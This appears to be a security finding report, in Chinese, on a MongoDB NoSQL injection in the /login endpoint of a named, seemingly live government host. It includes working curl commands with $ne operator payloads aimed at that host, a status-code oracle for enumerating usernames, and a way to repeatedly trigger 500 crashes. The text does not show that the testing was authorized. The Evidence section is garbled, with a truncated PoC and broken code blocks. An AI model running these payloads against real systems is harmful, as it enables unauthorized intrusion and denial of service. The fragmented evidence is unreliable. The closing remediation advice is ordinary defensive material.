# /login 接口存在 MongoDB NoSQL 注入（用户名/密码字段未过滤，状态码 oracle 泄露 source 校验，单/零文档触发 500 崩溃）

- ID: `ee28b5a7-94ed-418c-8af9-fc87d2c242a4`
- Severity: **high**
- Status: open
- Type: NoSQL 注入
- Target: `https://epcr.tpf.gov.tw:4004/login`
- Conversation: `532cedc0-0580-4045-a5e2-45c07c488867`
- Created: 2026-09-06 16:57:19.507094034+08:00

## Description

**漏洞类型**: MongoDB NoSQL 注入（认证端点，未过滤 `$` 操作符）\n\n**触发点**: `POST /login` 的 `username` / `password` 字段。后端将 JSON 请求体中的 username/password 直接拼入 MongoDB `find({username: X, password: Y})` 查询，未对 `$` 开头的操作符对象做类型校验/转义，导致查询操作符注入（Query Operator Injection）。\n\n**核心行为（已验证）**: 后端登录逻辑为「多文档匹配 → source 白名单校验（在密码校验之前）→ result[0] 处理」。具体：\n1. 用 `{"$ne":null}` 匹配**多个**用户文档 → 进入 source 校验路径 → 返回 403「無法登入的來源」（匹配到的用户 source 字段均不在服务端硬编码白名单，且 source 校验基于用户文档而非请求参数，domain/Origin/Referer 均被忽略）。\n2. 用**精确字符串**或 `$eq`/`$regex`/`$in`/`$where` 等匹配到 **0 或 1 个**文档 → 代码在处理 `result[0]` 时抛出未捕获的 `TypeError` → 返回 HTTP 500（body 仅 "TypeError"，无栈信息）。\n3. `$and` 嵌套 source 过滤把结果缩小到 ≤1 文档 → 同样 500。\n\n**状态码 Oracle**: 攻击者可仅凭响应码（403=多文档/source校验路径 vs 500=单/零文档崩溃）推断用户名存在性与文档分布，且泄露了「source 白名单校验先于密码校验」的认证流程细节。\n\n**认证绕过现状**: NoSQL 注入可到达 source 校验，但因所有可匹配用户的 source 均不在白名单（白名单为服务端硬编码、无法从请求控制），当前**未实现完整认证绕过**，但已突破密码校验前的 source 关卡并造成信息泄露+DoS。

## Preconditions

无需认证（未授权可达）；需先 GET /captcha 获取 connect.sid session cookie；Content-Type 为 application/json 或 application/x-www-form-urlencoded 均可触发。

## Reproduction

1. **建立 captcha session**（/login 需 connect.sid cookie）：\n   ```\n   curl -k -c /tmp/cj -X GET 'https://epcr.tpf.gov.tw:4004/captcha' -A 'Mozilla/5.0'\n   ```\n2. **触发 403（NoSQL 注入，多文档 source 路径）**：\n   ```\n   curl -k -b /tmp/cj -X POST 'https://epcr.tpf.gov.tw:4004/login' -H 'Content-Type: application/json' -A 'Mozilla/5.0' -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'\n   ```\n   观察：HTTP 403 + `{"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}`（无 Set-Cookie/Location/token）。\n3. **触发 500（NoSQL 注入，单/零文档崩溃）**：\n   ```\n   curl -k -b /tmp/cj -X POST 'https://epcr.tpf.gov.tw:4004/login' -H 'Content-Type: application/json' -A 'Mozilla/5.0' -d '{"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"}'\n   ```\n   观察：HTTP 500 + body 仅 "TypeError"（Content-Length 9）。\n4. **验证状态码 oracle（用户名存在性）**：对 admin/tpf/operator/dispatch/epcr/port/system/119/root 等精确 username 均返回 500（≤1 文档）；用 `{"$ne":null}` 返回 403（多文档）。\n5. **验证 domain 被忽略**：替换 domain 为 AUTH_SERVER/PORTAL/localhost/epcr.tpf.gov.tw/118.163.107.93 等 28 个值，响应恒为 403（仅 1 种响应），证明 source 校验基于用户文档而非请求参数。

## Evidence

curl -k -b /tmp/cj -X POST 'https://epcr.tpf.gov.tw:4004/login' \

  -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
# -> HTTP/2 403
#    {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}
```

**PoC 2 — NoSQL 注入触发 500 崩溃（单/零文档）**:

curl -k -c /tmp/cj -X GET 'https://epcr.tpf.gov.tw:4004/captcha' -A 'Mozilla/5.0'
curl -k -b /tmp/cj -X POST 'https://epcr.tpf.gov.tw:4004/login' \

**PoC 3 — 操作符对比矩阵（同一 $ne password 下）**:

```
for d in AUTH_SERVER PORTAL WEB TPF localhost epcr.tpf.gov.tw 118.163.107.93 35.234.50.28 ...:
  POST /login {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"$d"}

## Impact

1. **信息泄露**: 状态码 oracle（403 vs 500）可推断用户名存在性、用户文档分布、source 校验逻辑（source 白名单校验先于密码校验）。\n2. **DoS**: 任意未认证请求可重复触发未捕获的 TypeError（500），耗尽资源。\n3. **认证绕过潜力**: NoSQL 注入已突破 source 校验关卡前的查询阶段，若 source 白名单存在可被匹配的用户（当前测试 source 值均未命中），即可绕过密码直接登录；且 500 崩溃表明 result 处理存在未防御的单文档/零文档路径，是后续利用（如配合 source 字段值枚举）的入口。\n4. **扩大攻击面**: 后端普遍接受 Mongo/JQLike 操作符（services.js 证据），其他 JWT 保护端点（/DispatchRecords、/Branches 等）在获得 token 后可能存在同类注入。

## Recommendation

1. **过滤/转义查询操作符**: 对 username/password 入参做严格类型校验（必须为 string），拒绝以 `$` 开头的 key 的对象值；或使用 MongoDB 驱动的对象 ID 类型校验，避免 `$ne`/`$eq`/`$regex`/`$or`/`$and`/`$where`/`$in` 等操作符直接拼入查询。\n2. **防御单文档/零文档崩溃**: 修复 `result[0]` 处理逻辑，对空结果/单结果做边界检查，避免抛未捕获 TypeError（当前 500 暴露内部异常类型）。\n3. **统一认证错误响应**: 无论用户名/密码/source 校验失败，均返回相同的通用错误（如「帳號或密碼錯誤」）与相同状态码，消除状态码 oracle。\n4. **source 白名单校验顺序**: 评估是否应在密码校验之后再校验 source，避免 source 关卡提前暴露。\n5. **全局查询参数操作符白名单**: 对所有接受 JQLike/Mongo 操作符的端点（/login、/DispatchRecords、/Branches 等）统一实施操作符白名单与深度限制。
